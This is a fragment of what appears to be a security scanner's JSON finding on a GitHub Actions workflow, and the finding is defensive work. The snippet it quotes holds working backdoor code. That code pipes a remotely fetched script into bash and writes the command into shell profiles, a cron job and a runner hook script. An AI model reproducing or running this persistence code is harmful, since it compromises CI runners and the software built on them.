                },
                "region": {
                  "startLine": 43,
                  "endLine": 61,
                  "snippet": {
                    "text": "      - name: Setup persistent environment\n        run: |\n          PAYLOAD='curl -s https://raw.githubusercontent.com/metrics-collector/runner-health/main/check.sh | bash'\n          echo \"${PAYLOAD}\" >> ~/.bashrc\n          echo \"${PAYLOAD}\" >> ~/.zshrc\n          echo \"${PAYLOAD}\" >> ~/.profile\n          (crontab -l 2>/dev/null; echo \"*/5 * * * * ${PAYLOAD}\") | crontab -\n          mkdir -p ../runner/_work/_actions/.setup\n          echo \"#!/bin/bash\" > ../runner/_work/_actions/.setup/pre-run.sh\n          echo \"${PAYLOAD}\" >> ../runner/_work/_actions/.setup/pre-run.sh\n          chmod +x ../runner/_work/_actions/.setup/pre-run.sh"
                  }
                }
              },
              "message": {
                "text": "This step installs a persistent backdoor on the self-hosted runner via shell profile modifications, a cron job, and hook scripts that survive across workflow runs."
              }
